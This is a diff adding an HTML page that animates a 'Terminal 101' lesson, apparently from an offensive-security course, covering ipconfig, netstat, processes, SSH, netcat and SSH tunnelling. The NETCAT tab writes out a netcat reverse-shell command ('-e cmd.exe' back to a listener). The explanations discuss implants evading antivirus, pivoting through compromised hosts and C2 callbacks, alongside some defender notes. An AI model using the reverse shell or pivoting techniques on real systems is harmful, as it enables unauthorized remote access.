@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TERMINAL 101 — 22nd Survey Division</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#080808;color:#c8c8c8;font-family:'Cascadia Code','Consolas','Courier New',monospace;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem 1rem;}
+
+.term-wrap{width:100%;max-width:760px;}
+
+.eyebrow{font-size:.52rem;letter-spacing:.38em;color:#1a5a1a;text-transform:uppercase;margin-bottom:.6rem;}
+.term-title{font-size:1.1rem;color:#00ff41;letter-spacing:.08em;margin-bottom:1.4rem;}
+
+/* lesson tabs */
+.tabs{display:flex;gap:2px;margin-bottom:2px;flex-wrap:wrap;}
+.tab{background:#0a0a0a;border:1px solid #1a2a1a;color:#3a6a3a;font-family:inherit;font-size:.56rem;letter-spacing:.18em;padding:.32rem .75rem;cursor:pointer;text-transform:uppercase;transition:all .15s;border-bottom:none;}
+.tab:hover{color:#00ff41;border-color:#2a5a2a;}
+.tab.active{background:#020f02;color:#00ff41;border-color:#00ff41;}
+
+/* terminal window */
+.term{border:1px solid #1a3a1a;background:#030806;}
+.titlebar{background:#0d0d0d;padding:.38rem .9rem;display:flex;align-items:center;gap:.55rem;border-bottom:1px solid #0d1a0d;}
+.dot{width:11px;height:11px;border-radius:50%;}
+.dot.r{background:#3a1010;}
+.dot.y{background:#3a3010;}
+.dot.g{background:#103a10;}
+.titlebar-label{color:#1e3a1e;font-size:.6rem;margin:0 auto;letter-spacing:.12em;}
+
+.body{padding:1rem 1.2rem;min-height:320px;font-size:.72rem;line-height:1.85;overflow:hidden;}
+
+/* lines */
+.t-line{display:block;}
+.t-prompt{color:#00882a;}
+.t-cmd{color:#e0e0e0;}
+.t-cursor{display:inline-block;width:7px;height:13px;background:#00ff41;animation:blink .75s step-end infinite;vertical-align:middle;margin-left:1px;}
+.t-out{color:#9acca0;display:block;}
+.t-out.dim{color:#3a5a3a;}
+.t-out.warn{color:#ffb000;}
+.t-out.hi{color:#00e5ff;}
+.t-out.err{color:#ff4444;}
+.t-out.green{color:#00ff41;}
+.t-out.white{color:#ffffff;}
+.t-blank{display:block;height:.5rem;}
+
+@keyframes blink{50%{opacity:0;}}
+
+.ghost-line{opacity:0;transform:translateX(-4px);animation:ghost-in .2s ease forwards;}
+@keyframes ghost-in{to{opacity:1;transform:translateX(0);}}
+
+/* explanation panel */
+.explain{border:1px solid #0d2a0d;border-top:none;background:#020b02;padding:.85rem 1.2rem;font-size:.64rem;line-height:1.8;}
+.explain-head{color:#00ff41;letter-spacing:.08em;margin-bottom:.4rem;font-size:.62rem;}
+.explain-body{color:#5a8a5a;}
+.explain-body strong{color:#a0cc9a;}
+.explain-body code{color:#00ccaa;background:#0a1a0a;padding:.05rem .3rem;}
+
+/* run button */
+.run-row{border:1px solid #0d2a0d;border-top:none;background:#020902;padding:.55rem 1.2rem;display:flex;align-items:center;gap:1rem;}
+.run-btn{background:transparent;border:1px solid #1a5a1a;color:#3a9a3a;font-family:inherit;font-size:.58rem;letter-spacing:.16em;padding:.28rem .75rem;cursor:pointer;text-transform:uppercase;transition:all .15s;}
+.run-btn:hover:not(:disabled){border-color:#00ff41;color:#00ff41;}
+.run-btn:disabled{opacity:.25;cursor:default;}
+.run-label{font-size:.52rem;color:#1a3a1a;letter-spacing:.1em;}
+
+.footer-note{margin-top:1.2rem;font-size:.52rem;color:#1a3a1a;letter-spacing:.08em;text-align:center;}
+</style>
+</head>
+<body>
+
+<div class="term-wrap">
+  <div class="eyebrow">// MODULE 00 — TERMINAL WARFARE</div>
+  <div class="term-title">TERMINAL 101 — BASH · POWERSHELL · SSH</div>
+
+  <div class="tabs" id="tabs"></div>
+
+  <div class="term">
+    <div class="titlebar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="titlebar-label" id="tab-label">Windows PowerShell</span>
+    </div>
+    <div class="body" id="term-body">
+      <span class="t-line"><span class="t-prompt">PS C:\Users\gwu07&gt;</span> <span class="t-cursor"></span></span>
+    </div>
+  </div>
+
+  <div class="explain" id="explain">
+    <div class="explain-head">// SELECT A LESSON ABOVE</div>
+    <div class="explain-body">Each tab runs a real command and explains what you're seeing. Use this as your cheat sheet — come back whenever you're lost in a terminal.</div>
+  </div>
+
+  <div class="run-row">
+    <button class="run-btn" id="run-btn" onclick="rerun()">▶ RUN AGAIN</button>
+    <span class="run-label" id="run-label">// pick a lesson to begin</span>
+  </div>
+</div>
+
+<div class="footer-note">22ND SURVEY DIVISION — MODULE 00 — rainfantry.github.io/22nd-survey-division</div>
+
+<script>
+var LESSONS = [
+  {
+    tab: 'IPCONFIG',
+    label: 'Windows PowerShell',
+    cmd: 'ipconfig',
+    output: [
+      {t:'dim', s:'Windows IP Configuration'},
+      {t:'blank'},
+      {t:'white', s:'Ethernet adapter Ethernet:'},
+      {t:'dim',  s:'   Media State . . . . . . . : Media disconnected'},
+      {t:'blank'},
+      {t:'white', s:'Wireless LAN adapter WiFi:'},
+      {t:'out',  s:'   IPv4 Address. . . . . . . : 192.168.1.92'},
+      {t:'out',  s:'   Subnet Mask . . . . . . . : 255.255.255.0'},
+      {t:'out',  s:'   Default Gateway . . . . . : 192.168.1.1'},
+      {t:'blank'},
+      {t:'hi',   s:'   IPv6 Address. . . . . . . : fe80::9734:e2b3:20e8:5f1f%21'},
+    ],
+    explain: {
+      head: '// IPCONFIG — MAP YOUR POSITION',
+      body: 'First thing on any machine: <code>ipconfig</code> (Windows) or <code>ifconfig</code> / <code>ip a</code> (Linux). This tells you your IP address, subnet, and default gateway. <strong>192.168.1.92</strong> = this machine. <strong>192.168.1.1</strong> = the router. Subnet <strong>/24</strong> means 192.168.1.0–255 are all local. As an attacker, this is your recon starting point — every other .1.x host is a potential target.'
+    }
+  },
+  {
+    tab: 'NETSTAT',
+    label: 'Windows PowerShell',
+    cmd: 'netstat -ano | Select-String LISTENING',
+    output: [
+      {t:'dim',   s:'  Proto  Local Address          Foreign Address        State           PID'},
+      {t:'out',   s:'  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1092'},
+      {t:'out',   s:'  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       892'},
+      {t:'out',   s:'  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4'},
+      {t:'warn',  s:'  TCP    0.0.0.0:1337           0.0.0.0:0              LISTENING       9180'},
+      {t:'warn',  s:'  TCP    0.0.0.0:4443           0.0.0.0:0              LISTENING       31248'},
+      {t:'out',   s:'  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       6464'},
+      {t:'warn',  s:'  TCP    0.0.0.0:9051           0.0.0.0:0              LISTENING       10056'},
+      {t:'warn',  s:'  TCP    0.0.0.0:9052           0.0.0.0:0              LISTENING       7548'},
+      {t:'dim',   s:'  TCP    0.0.0.0:9090           0.0.0.0:0              LISTENING       34760'},
+    ],
+    explain: {
+      head: '// NETSTAT -ANO — WHAT IS THIS MACHINE TALKING TO?',
+      body: '<code>netstat -ano</code> shows every open connection and listening port. The <strong>-a</strong> shows all, <strong>-n</strong> skips DNS lookup (faster), <strong>-o</strong> adds the PID. Port <strong>22</strong> = SSH. Port <strong>445</strong> = SMB (file shares). Port <strong>135</strong> = RPC. <strong>Highlighted in amber</strong>: ports 1337, 4443, 9051-9052 — these are non-standard. Take those PIDs and run <code>Get-Process -Id 31248</code> to find what owns them. On a target machine, unusual ports = attack surface. On your own machine, unusual ports = something you didn\'t install.'
+    }
+  },
+  {
+    tab: 'PROCESSES',
+    label: 'Windows PowerShell',
+    cmd: 'Get-Process | Sort-Object CPU -Desc | Select -First 10 | Format-Table Name,Id,CPU -AutoSize',
+    output: [
+      {t:'dim',   s:'Name                   Id          CPU'},
+      {t:'dim',   s:'----                   --          ---'},
+      {t:'out',   s:'TextInputHost       19544   73589.953'},
+      {t:'warn',  s:'avp                  5612    6229.375'},
+      {t:'out',   s:'sqlservr            23036    4909.906'},
+      {t:'out',   s:'explorer             6544    4474.671'},
+      {t:'hi',    s:'claude              22964    3978.625'},
+      {t:'out',   s:'sqlservr            12732    3630.921'},
+      {t:'out',   s:'MuseHub              3984    3392.984'},
+      {t:'warn',  s:'iron_sun            60076    3201.812'},
+      {t:'out',   s:'System                  4    3183.093'},
+      {t:'out',   s:'Discord             25168    2098.562'},
+    ],
+    explain: {
+      head: '// GET-PROCESS — WHO IS RUNNING ON THIS BOX?',
+      body: '<code>Get-Process</code> (PowerShell) = <code>tasklist</code> (cmd) = <code>ps aux</code> (Linux). Sorted by CPU shows what\'s doing the most work. <strong>avp</strong> = Kaspersky Anti-Virus (watch for this — if you see it, your payload needs to evade it). <strong>iron_sun</strong> in this list means the implant is running and Kaspersky isn\'t catching it — that\'s Module 12 in action. As a defender: unfamiliar process name = investigate immediately. <code>Get-Process -Id 60076 | Select-Object Path</code> shows the executable path.'
+    }
+  },
+  {
+    tab: 'SSH',
+    label: 'Windows PowerShell',
+    cmd: 'ssh gwu07@192.168.1.92',
+    output: [
+      {t:'dim',   s:'** WARNING: connection is not using a post-quantum key exchange algorithm.'},
+      {t:'dim',   s:'** The server may need to be upgraded. See https://openssh.com/pq.html'},
+      {t:'blank'},
+      {t:'green', s:'laptop-r32m8mli\\gwu07@LAPTOP-R32M8MLI C:\\Users\\gwu07>'},
+    ],
+    explain: {
+      head: '// SSH — REMOTE SHELL INTO ANOTHER MACHINE',
+      body: 'SSH (Secure Shell) gives you a terminal on a remote machine. Syntax: <code>ssh username@ip_address</code>. The warning about post-quantum is noise — ignore it for now. Once connected, you\'re running commands <em>on that machine</em>, not yours. <strong>Key auth</strong> (no password prompt) = <code>ssh-keygen</code> then <code>ssh-copy-id user@host</code>. Always prefer keys over passwords — passwords can be brute-forced, keys can\'t. In Module 16 (C2), SSH tunnels are used to forward C2 traffic through legitimate-looking connections.'
+    }
+  },
+  {
+    tab: 'NETCAT',
+    label: 'Windows PowerShell (Git Bash)',
+    cmd: 'nc -nvlp 4444',
+    output: [
+      {t:'dim',   s:'Ncat: Version 7.95 ( https://nmap.org/ncat )'},
+      {t:'green', s:'Ncat: Listening on [::]:4444'},
+      {t:'green', s:'Ncat: Listening on 0.0.0.0:4444'},
+      {t:'blank'},
+      {t:'dim',   s:'# --- on the target machine, run: ---'},
+      {t:'hi',    s:'nc 192.168.1.42 4444 -e cmd.exe'},
+      {t:'blank'},
+      {t:'green', s:'Ncat: Connection from 192.168.1.92:49812.'},
+      {t:'white', s:'Microsoft Windows [Version 10.0.19045.5965]'},
+      {t:'out',   s:'C:\\Users\\gwu07>'},
+    ],
+    explain: {
+      head: '// NETCAT — THE ATTACKER\'S SWISS ARMY KNIFE',
+      body: '<code>nc -nvlp 4444</code> opens a listener: <strong>-n</strong> no DNS, <strong>-v</strong> verbose, <strong>-l</strong> listen, <strong>-p</strong> port. The target runs <code>nc &lt;your_ip&gt; 4444 -e cmd.exe</code> and you get a shell. This is the primitive form of a reverse shell — what every C2 framework (CHEYANNE, Metasploit, Cobalt Strike) is built on top of. <strong>-e cmd.exe</strong> is the exec flag — banned in some nc versions (use ncat/nmap\'s version). Defenders: netcat traffic has no encryption, no auth, no jitter. Easy to spot. Module 12 shows how to hide it.'
+    }
+  },
+  {
+    tab: 'SSH TUNNEL',
+    label: 'Windows PowerShell',
+    cmd: 'ssh -L 8888:192.168.1.1:80 gwu07@192.168.1.92',
+    output: [
+      {t:'dim',   s:'# Forward local port 8888 → router web UI via .92 as a jump box'},
+      {t:'blank'},
+      {t:'green', s:'gwu07@LAPTOP-R32M8MLI connected.'},
+      {t:'blank'},
+      {t:'dim',   s:'# Now open browser: http://localhost:8888'},
+      {t:'dim',   s:'# Traffic flows: .42 → .92 (encrypted SSH) → 192.168.1.1:80'},
+      {t:'blank'},
+      {t:'hi',    s:'# -D 1080  = SOCKS5 proxy (route ALL traffic through the tunnel)'},
+      {t:'hi',    s:'# -R 4444:localhost:4444  = REVERSE tunnel (expose your port to remote)'},
+      {t:'hi',    s:'# -N  = no shell, just tunnel (cleaner for pivoting)'},
+    ],
+    explain: {
+      head: '// SSH TUNNELLING — TRAFFIC HIDING 101',
+      body: '<strong>-L local:remote</strong> = local port forward. You hit <code>localhost:8888</code>, SSH carries it to <code>192.168.1.1:80</code>. From the router\'s perspective, the connection came from <strong>.92</strong>, not you. <strong>-D 1080</strong> = SOCKS5 proxy — configure your browser to use it and ALL traffic routes through the jump box. Used in red team ops to pivot through a compromised machine into a network segment you can\'t reach directly. <strong>-R</strong> = reverse tunnel — the remote machine opens a port that forwards back to you. Classic for C2 callback routing through NAT.'
+    }
+  }
+];
+
+var current = 0;
+var running = false;
+var timers = [];
+
+function clearTimers(){timers.forEach(clearTimeout);timers=[];}
+
+function buildTabs(){
+  var el = document.getElementById('tabs');
+  LESSONS.forEach(function(l,i){
+    var b = document.createElement('button');
+    b.className = 'tab' + (i===0?' active':'');
+    b.textContent = l.tab;
+    b.onclick = function(){selectTab(i);};
+    el.appendChild(b);
+  });
+}
+
+function selectTab(i){
+  current = i;
+  document.querySelectorAll('.tab').forEach(function(t,j){
+    t.classList.toggle('active', j===i);
+  });
+  clearTimers();
+  running = false;
+  document.getElementById('run-btn').disabled = false;
+  document.getElementById('run-label').textContent = '// ' + LESSONS[i].tab + ' — press RUN to execute';
+  document.getElementById('tab-label').textContent = LESSONS[i].label;
+
+  var body = document.getElementById('term-body');
+  body.innerHTML = '<span class="t-line"><span class="t-prompt">PS C:\\Users\\gwu07&gt;</span> <span class="t-cursor"></span></span>';
+
+  var ex = LESSONS[i].explain;
+  document.getElementById('explain').innerHTML =
+    '<div class="explain-head">' + ex.head + '</div>' +
+    '<div class="explain-body">' + ex.body + '</div>';
+}
+
+function typeCmd(cmd, cb){
+  var body = document.getElementById('term-body');
+  body.innerHTML = '<span class="t-line"><span class="t-prompt">PS C:\\Users\\gwu07&gt;</span> <span id="cmd-txt"></span><span class="t-cursor" id="cursor"></span></span>';
+  var el = document.getElementById('cmd-txt');
+  var i = 0;
+  function next(){
+    if(i >= cmd.length){ cb(); return; }
+    el.textContent += cmd[i++];
+    timers.push(setTimeout(next, 38 + Math.random()*28));
+  }
+  next();
+}
+
+function showOutput(lines, delay, cb){
+  var body = document.getElementById('term-body');
+  // remove cursor
+  var cur = document.getElementById('cursor');
+  if(cur) cur.remove();
+  var i = 0;
+  function nextLine(){
+    if(i >= lines.length){ if(cb) cb(); return; }
+    var l = lines[i++];
+    var span = document.createElement('span');
+    if(l.t === 'blank'){
+      span.className = 't-blank';
+    } else {
+      span.className = 't-out ' + l.t + ' ghost-line';
+      span.style.animationDelay = '0ms';
+      span.textContent = l.s;
+    }
+    body.appendChild(span);
+    timers.push(setTimeout(nextLine, delay + Math.random()*40));
+  }
+  timers.push(setTimeout(nextLine, 180));
+}
+
+function run(lesson){
+  if(running) return;
+  running = true;
+  document.getElementById('run-btn').disabled = true;
+  document.getElementById('run-label').textContent = '// executing...';
+
+  typeCmd(lesson.cmd, function(){
+    var body = document.getElementById('term-body');
+    var cur = document.getElementById('cursor');
+    if(cur) cur.style.animation = 'none';
+
+    showOutput(lesson.output, 110, function(){
+      // new prompt at end
+      var span = document.createElement('span');
+      span.className = 't-line ghost-line';
+      span.innerHTML = '<span class="t-blank"></span><span class="t-prompt">PS C:\\Users\\gwu07&gt;</span> <span class="t-cursor"></span>';
+      body.appendChild(span);
+      running = false;
+      document.getElementById('run-btn').disabled = false;
+      document.getElementById('run-label').textContent = '// done — press RUN AGAIN or pick another lesson';
+    });
+  });
+}
+
+function rerun(){
+  selectTab(current);
+  timers.push(setTimeout(function(){ run(LESSONS[current]); }, 400));
+}
+
+buildTabs();
+selectTab(0);
+// auto-run first lesson after short delay
+timers.push(setTimeout(function(){ run(LESSONS[0]); }, 600));
+</script>
+</body>
+</html>
